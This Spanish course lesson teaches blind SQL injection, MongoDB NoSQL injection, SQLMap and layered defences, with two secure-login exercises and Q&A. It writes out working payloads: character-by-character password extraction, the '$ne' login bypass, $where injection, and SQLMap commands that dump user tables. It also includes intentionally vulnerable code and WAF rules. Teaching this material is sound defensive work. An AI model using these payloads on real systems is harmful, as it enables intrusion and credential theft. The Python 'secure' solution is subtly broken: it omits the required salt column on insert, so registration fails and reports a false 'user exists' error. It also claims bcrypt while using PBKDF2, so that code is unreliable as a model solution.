# Clase 17: Inyeccion SQL Avanzada y NoSQL

**Duracion:** 2 horas

---

## Objetivos de Aprendizaje

1. Comprender y ejecutar tecnicas de inyeccion SQL a ciegas (Blind SQL)
2. Diferenciar entre Blind SQL basada en booleanos y basada en tiempo
3. Identificar y explotar inyeccion NoSQL en MongoDB
4. Implementar defensa en profundidad contra todo tipo de inyecciones

---

## Contenido Detallado

### 1. Inyeccion SQL a Ciegas (Blind SQL Injection)

Ocurre cuando la aplicacion no muestra datos de la BD directamente, pero el comportamiento cambia segun si la consulta es verdadera o falsa.

#### Blind SQL Basada en Booleanos

El atacante envia preguntas de si/no y observa la respuesta de la aplicacion (carga diferente, mensaje de error diferente, redireccion diferente).

```
Consulta original:  SELECT * FROM productos WHERE id = 1
Respuesta:          Muestra producto normal

Consulta inyectada: SELECT * FROM productos WHERE id = 1 AND 1=1
Respuesta:          Misma respuesta (siempre verdadero)

Consulta inyectada: SELECT * FROM productos WHERE id = 1 AND 1=2
Respuesta:          No muestra nada (siempre falso)

Diferencia:         La app es vulnerable a Blind SQL!
```

**Extrayendo datos caracter por caracter:**

```sql
-- ?La primera letra del password del admin es 'a'?
SELECT * FROM productos WHERE id = 1 AND
    SUBSTRING((SELECT password FROM usuarios WHERE username='admin'), 1, 1) = 'a'

-- Si muestra producto: la letra es 'a'
-- Si no muestra: no es 'a', probar 'b', 'c', etc.

-- ?El password tiene mas de 5 caracteres?
SELECT * FROM productos WHERE id = 1 AND
    LENGTH((SELECT password FROM usuarios WHERE username='admin')) > 5
```

**Proceso completo de extraccion:**
1. Determinar longitud del valor: preguntar > 1, > 2, > 3... hasta encontrar el limite
2. Extraer caracter 1: probar 'a', 'b', 'c'... hasta encontrar match
3. Repetir para cada caracter hasta la longitud total

#### Blind SQL Basada en Tiempo (Time-based)

Cuando la app no muestra diferencias en la respuesta (misma pagina, mismos errores), se usa retardos provocados por funciones como SLEEP(), WAITFOR DELAY, pg_sleep.

```sql
-- MySQL
SELECT * FROM productos WHERE id = 1 AND IF(1=1, SLEEP(5), 0)

-- SQL Server
SELECT * FROM productos WHERE id = 1; WAITFOR DELAY '0:0:5'

-- PostgreSQL
SELECT * FROM productos WHERE id = 1 AND pg_sleep(5)

-- ?La primera letra del password es 'a'?
SELECT * FROM productos WHERE id = 1 AND
    IF(SUBSTRING((SELECT password FROM usuarios WHERE username='admin'),1,1)='a',
       SLEEP(5), 0)
-- Si tarda 5 segundos: la letra es 'a'
-- Si responde inmediato: no es 'a'
```

### 2. Inyeccion NoSQL en MongoDB

MongoDB usa un lenguaje de consulta basado en JSON/BSON. Las inyecciones ocurren cuando los parametros del usuario se concatenan directamente en las consultas.

#### Como funciona MongoDB

```javascript
// Consulta normal en MongoDB
db.usuarios.find({ username: "admin", password: "secreto" })

// Operadores especiales
db.usuarios.find({ username: "admin", password: { $ne: "" } })
// $ne = not equal -> devuelve cualquier usuario cuyo password no este vacio
```

#### Inyeccion en Consultas con String Concatenation

**Vulnerable (Node.js):**
```javascript
const username = req.body.username;
const password = req.body.password;

// VULNERABLE: concatenacion en string JSON
const query = `{ username: '${username}', password: '${password}' }`;
db.collection('usuarios').find(JSON.parse(query)).toArray((err, users) => {
    if (users.length > 0) {
        // Login exitoso!
    }
});
```

**Explotacion:**
```
Enviar como username: admin
Enviar como password: $ne}  (cierra el JSON y anade operador)
El JSON resultante:   { username: 'admin', password: '$ne'}  }

Pero mejor, explotar la inyeccion directa:

username = admin
password = { "$ne": "" }

Si no hay validacion de tipos, se pasa objeto directamente:
query = { username: 'admin', password: { "$ne": "" } }
```

**Explotacion tipica en APIs REST:**
```json
// Peticion POST a /api/login
// Payload malicioso:
{
    "username": "admin",
    "password": { "$ne": "" }
}

// Consulta generada:
db.usuarios.findOne({
    "username": "admin",
    "password": { "$ne": "" }
})
// Devuelve admin si existe (bypass de autenticacion)
```

#### Inyeccion $where

El operador `$where` permite ejecutar JavaScript arbitrario en la BD.

```javascript
// VULNERABLE
db.usuarios.find({ $where: "this.username == '" + username + "'" });

// Explotacion
username = "' || true || '"
// Resultado: this.username == '' || true || ''
// Devuelve todos los usuarios!

// RCE via $where
username = "'; return 'a' == 'a"
// O incluso inyectar codigo mas complejo
```

### 3. Herramientas: SQLMap

SQLMap es la herramienta mas popular para detectar y explotar automaticamente inyecciones SQL.

**Uso basico:**
```bash
# Detectar si una URL es vulnerable
sqlmap -u "http://target.com/producto.php?id=1"

# Con cookie de sesion
sqlmap -u "http://target.com/producto.php?id=1" --cookie="session=abc123"

# Extraer bases de datos
sqlmap -u "http://target.com/producto.php?id=1" --dbs

# Extraer tablas de una BD
sqlmap -u "http://target.com/producto.php?id=1" -D nombre_bd --tables

# Extraer datos de una tabla
sqlmap -u "http://target.com/producto.php?id=1" -D nombre_bd -T usuarios --dump

# Modo de riesgo alto
sqlmap -u "http://target.com/producto.php?id=1" --level=5 --risk=3
```

**Flags importantes:**
- `--level`: Profundidad de pruebas (1-5, default 1)
- `--risk`: Riesgo de pruebas (1-3, default 1)
- `--technique`: Tecnica especifica (B: Boolean, T: Time, E: Error, U: Union, S: Stacked)
- `--threads`: Hilos para acelerar
- `--batch`: Modo no interactivo
- `--dump-all`: Extraer todo

**Demo educativa:**
```bash
# Probar con parametro POST
sqlmap -u "http://testapp.com/login" --data="username=admin&password=test"

# Blind SQL time-based
sqlmap -u "http://testapp.com/producto.php?id=1" --technique=T --time-sec=3
```

### 4. Defensa en Profundidad contra Inyecciones

```
CAPAS DE DEFENSA
+----------------------------------------------------------+
|  Capa 1: Prepared Statements/Parametrizacion (obligatorio)|
+----------------------------------------------------------+
|  Capa 2: Validacion de entrada (whitelist)                |
+----------------------------------------------------------+
|  Capa 3: ORM con configuracion segura                     |
+----------------------------------------------------------+
|  Capa 4: WAF (ModSecurity, Cloudflare)                    |
+----------------------------------------------------------+
|  Capa 5: Minimo privilegio en BD                          |
+----------------------------------------------------------+
|  Capa 6: Monitoreo y logging                              |
+----------------------------------------------------------+
```

**Stored Procedures (con parametros):**
```sql
CREATE PROCEDURE sp_login
    @username NVARCHAR(50),
    @password NVARCHAR(50)
AS
BEGIN
    SELECT * FROM usuarios WHERE username = @username AND password_hash = @password
END
```

**WAF Reglas (ModSecurity):**
```apache
# Prevenir inyeccion SQL
SecRule REQUEST_COOKIES|REQUEST_HEADERS|ARGS "@detectSQLi" \
    "id:942100,severity:CRITICAL,block,msg:'SQL Injection Detected'"

# Prevenir inyeccion NoSQL
SecRule REQUEST_BODY "@detectNoSQLi" \
    "id:942200,severity:CRITICAL,block,msg:'NoSQL Injection Detected'"
```

---

## Ejercicio 1: Login Seguro con Parametros (Python + SQLite)

Crear un script completo de login seguro con las siguientes caracteristicas:
- Registro de usuarios con contrasena hasheada (bcrypt)
- Login con consultas parametrizadas
- Proteccion contra fuerza bruta (limite de intentos)
- Mensajes de error genericos
- Logging de intentos sin datos sensibles

```python
import sqlite3
import hashlib
import os
import time
import re

DB_PATH = 'safe_login.db'
MAX_ATTEMPTS = 5
LOCKOUT_TIME = 300  # 5 minutos en segundos

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            salt TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            attempt_time INTEGER NOT NULL,
            success INTEGER NOT NULL,
            ip_address TEXT
        )
    ''')
    conn.commit()
    conn.close()

def hash_password(password, salt=None):
    if salt is None:
        salt = os.urandom(32).hex()
    # PBKDF2 con SHA-256 (similar a como funciona internamente bcrypt)
    pwd_hash = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt.encode('utf-8'),
        100000  # 100,000 iteraciones
    ).hex()
    return f"{salt}${pwd_hash}"

def verify_password(password, stored_hash):
    salt, pwd_hash = stored_hash.split('$')
    return hash_password(password, salt) == stored_hash

def is_locked_out(username):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = int(time.time())
    lockout_time = current_time - LOCKOUT_TIME

    cursor.execute('''
        SELECT COUNT(*) FROM login_attempts
        WHERE username = ? AND attempt_time > ? AND success = 0
    ''', (username, lockout_time))

    count = cursor.fetchone()[0]
    conn.close()
    return count >= MAX_ATTEMPTS

def register(username, password):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        return "Error: Username debe tener 3-20 caracteres alfanumericos"

    if len(password) < 8:
        return "Error: Password debe tener al menos 8 caracteres"

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    try:
        pwd_hash = hash_password(password)
        cursor.execute(
            "INSERT INTO usuarios (username, password_hash) VALUES (?, ?)",
            (username, pwd_hash)
        )
        conn.commit()
        return "Usuario registrado exitosamente"
    except sqlite3.IntegrityError:
        return "Error: El usuario ya existe"
    finally:
        conn.close()

def login(username, password):
    # Verificar lockout
    if is_locked_out(username):
        return "Cuenta temporalmente bloqueada. Intente en 5 minutos."

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # Consulta parametrizada (segura contra SQLi)
    cursor.execute(
        "SELECT password_hash FROM usuarios WHERE username = ?",
        (username,)
    )
    result = cursor.fetchone()

    current_time = int(time.time())

    if result and verify_password(password, result[0]):
        # Login exitoso
        cursor.execute(
            "INSERT INTO login_attempts (username, attempt_time, success) VALUES (?, ?, 1)",
            (username, current_time)
        )
        conn.commit()
        conn.close()
        return "Login exitoso. Bienvenido!"
    else:
        # Login fallido - registrar intento
        cursor.execute(
            "INSERT INTO login_attempts (username, attempt_time, success) VALUES (?, ?, 0)",
            (username, current_time)
        )
        conn.commit()
        conn.close()
        return "Credenciales invalidas"  # Mensaje generico, no revela que fallo

# Demo
if __name__ == "__main__":
    init_db()

    # Registrar usuario
    print(register("admin", "MiPasswordSegura123!"))

    # Login correcto
    print(login("admin", "MiPasswordSegura123!"))

    # Login incorrecto (intento de inyeccion SQL)
    print(login("admin", "' OR '1'='1"))  # No bypassea, busca como literal

    # Probar lockout por fuerza bruta
    for i in range(5):
        result = login("admin", "wrongpass")
        print(f"Intento {i+1}: {result}")
    # El sexto intento deberia estar bloqueado
    print(login("admin", "MiPasswordSegura123!"))  # Bloqueado
```

### Explicacion de la Solucion

1. **Parametrizacion:** Todas las consultas SQL usan `?` placeholders
2. **Hashing:** Se usa PBKDF2 con SHA-256, salt unico de 32 bytes, 100,000 iteraciones
3. **Lockout:** 5 intentos fallidos bloquean por 5 minutos
4. **Mensajes genericos:** No se revela si el usuario existe o no
5. **Logging:** Se registran todos los intentos con timestamp
6. **Validacion de username:** Solo caracteres alfanumericos y guion bajo

---

## Ejercicio 2: Migrar Codigo MongoDB Vulnerable a Parametros Seguros

**Codigo vulnerable:**
```javascript
// VULNERABLE: Node.js + MongoDB
const express = require('express');
const MongoClient = require('mongodb').MongoClient;

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    const db = await MongoClient.connect('mongodb://localhost:27017/mydb');

    // VULNERABLE: concatenacion directa
    const query = `{ "username": "${username}", "password": "${password}" }`;
    const user = await db.collection('usuarios').findOne(JSON.parse(query));

    if (user) {
        res.json({ success: true, token: generateToken(user) });
    } else {
        res.json({ success: false, message: 'Credenciales invalidas' });
    }
});
```

**Codigo corregido con parametros seguros:**
```javascript
const express = require('express');
const MongoClient = require('mongodb').MongoClient;
const bcrypt = require('bcrypt');
const crypto = require('crypto');

const app = express();
app.use(express.json());  // Importante: parsear JSON correctamente

// Conexion con configuracion segura
const DB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/mydb';

function sanitizeInput(input) {
    if (typeof input !== 'string') {
        return '';
    }
    // Remover caracteres que podrian usarse en inyeccion NoSQL
    return input.replace(/[\$\{\}\(\)]/g, '');
}

function generateToken(user) {
    return crypto.randomBytes(32).toString('hex');
}

app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        // Validar que sean strings
        if (typeof username !== 'string' || typeof password !== 'string') {
            return res.status(400).json({
                success: false,
                message: 'Credenciales invalidas'
            });
        }

        // Sanitizar (capa adicional)
        const safeUsername = sanitizeInput(username);

        // Usar el driver de MongoDB con parametros (NO concatenacion)
        const client = await MongoClient.connect(DB_URI);
        const db = client.db();

        // SEGURO: pasar valores como propiedades, NO como string JSON
        const user = await db.collection('usuarios').findOne({
            username: safeUsername
        });

        if (user && await bcrypt.compare(password, user.passwordHash)) {
            const token = generateToken(user);
            await db.collection('sesiones').insertOne({
                userId: user._id,
                token: token,
                createdAt: new Date(),
                expiresAt: new Date(Date.now() + 3600000) // 1 hora
            });

            client.close();
            return res.json({
                success: true,
                token: token
            });
        }

        client.close();
        return res.status(401).json({
            success: false,
            message: 'Credenciales invalidas'
        });

    } catch (error) {
        console.error('Error en login:', error.message);
        return res.status(500).json({
            success: false,
            message: 'Error interno del servidor'
        });
    }
});

// Registro seguro
app.post('/api/register', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (typeof username !== 'string' || typeof password !== 'string') {
            return res.status(400).json({
                success: false,
                message: 'Datos invalidos'
            });
        }

        if (password.length < 8) {
            return res.status(400).json({
                success: false,
                message: 'Password debe tener al menos 8 caracteres'
            });
        }

        const safeUsername = sanitizeInput(username);
        const saltRounds = 12;
        const passwordHash = await bcrypt.hash(password, saltRounds);

        const client = await MongoClient.connect(DB_URI);
        const db = client.db();

        // SEGURO: parametros como objeto, no string
        await db.collection('usuarios').insertOne({
            username: safeUsername,
            passwordHash: passwordHash,
            createdAt: new Date()
        });

        client.close();
        return res.status(201).json({
            success: true,
            message: 'Usuario registrado'
        });

    } catch (error) {
        if (error.code === 11000) { // Duplicate key
            return res.status(409).json({
                success: false,
                message: 'El usuario ya existe'
            });
        }
        console.error('Error en registro:', error.message);
        return res.status(500).json({
            success: false,
            message: 'Error interno del servidor'
        });
    }
});
```

### Principios aplicados en la correccion:

1. **Objetos literales en vez de strings JSON:** `{ username: safeUsername }` es seguro porque el driver no evalua los valores como codigo
2. **bcrypt:** Hashing de contrasenas con factor de costo 12
3. **Validacion de tipos:** Asegurar que username y password son strings
4. **Sanitizacion:** Remover caracteres especiales NoSQL ($, {, }, (, ))
5. **Mensajes genericos:** No revelar si el usuario existe
6. **Manejo de errores:** No exponer detalles tecnicos
7. **Rate limiting implicito:** El cliente puede anadirlo como middleware

---

## Preguntas y Respuestas

### Pregunta 1
**Cual es la diferencia practica entre Blind SQL basada en booleanos y basada en tiempo?**

**Respuesta:** La Blind SQL booleana usa diferencias observables en la respuesta (contenido HTML, codigos HTTP, redirecciones) para inferir verdadero/falso. La Blind SQL basada en tiempo se usa cuando NO hay diferencias observables, introduciendo retardos (SLEEP, WAITFOR) para inferir. La basada en tiempo es mas lenta (cada pregunta requiere 5+ segundos de espera) pero funciona en escenarios donde la booleana no es posible.

### Pregunta 2
**Por que la inyeccion NoSQL en MongoDB puede ser mas peligrosa que la SQL tradicional?**

**Respuesta:** En MongoDB, el operador `$where` permite ejecutar JavaScript arbitrario en el motor de BD, lo que puede llevar a RCE (Remote Code Execution) completa, no solo a robo de datos. Ademas, las inyecciones NoSQL pueden explotar operadores como `$ne`, `$regex`, `$gt` para manipular la logica de consultas de formas que no tienen equivalente directo en SQL.

### Pregunta 3
**SQLMap puede automatizar Blind SQL injection. Como lo hace internamente?**

**Respuesta:** SQLMap primero determina si el parametro es vulnerable enviando payloads que causan diferencias detectables (como `1=1` vs `1=2`). Luego, para Blind SQL basada en booleanos, usa busqueda binaria para determinar cada caracter del valor extraido (no prueba letra por letra, sino que usa comparaciones mayor/menor ASCII para converger mas rapido). Para Time-based, mide el tiempo de respuesta con alta precision y usa retardos controlados. SQLMap tambien puede usar tecnicas de inferencia estadistica cuando las diferencias son sutiles.

### Pregunta 4
**Que es el operador $regex en MongoDB y como puede explotarse?**

**Respuesta:** `$regex` permite busquedas por expresion regular en MongoDB. Puede explotarse si el atacante controla el patron regex. Por ejemplo, si la app construye: `{ username: { $regex: input } }`, el atacante puede enviar `^a.*` para encontrar usuarios que empiecen con 'a', `^admin` para el admin, etc. Es similar a un "Blind SQL" donde se puede inferir informacion caracter por caracter. La mitigacion es nunca permitir que el usuario controle operadores de MongoDB directamente.

### Pregunta 5
**Teniendo prepared statements, es necesario ademas tener WAF y validacion de entrada? No es redundante?**

**Respuesta:** No es redundante, es defense in depth. Los prepared statements protegen contra inyeccion SQL en la capa de BD, pero un WAF puede bloquear ataques antes de que lleguen a la aplicacion, protegiendo contra: (1) ataques a otros componentes que no usan prepared statements, (2) vulnerabilidades en el ORM o en consultas raw residuales, (3) ataques de inyeccion NoSQL, (4) ataques de tipo log4j que no estan relacionados con BD. La validacion de entrada protege contra otros vectores (XSS, path traversal, command injection). Las capas de defensa cubren diferentes vectores y se complementan.

---

## Tarea / Lectura Recomendada

1. **Leer:** OWASP NoSQL Injection Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Cheat_Sheet.html
2. **Practicar:** Blind SQL injection labs en PortSwigger Web Security Academy
3. **Experimentar:** Instalar SQLMap en un entorno controlado y practicar contra DVWA (Damn Vulnerable Web Application) en Docker
4. **Profundizar:** Leer "MongoDB Security Reference" - https://www.mongodb.com/docs/manual/security/
5. **Herramienta:** Configurar ModSecurity con OWASP CRS (Core Rule Set) en un servidor local



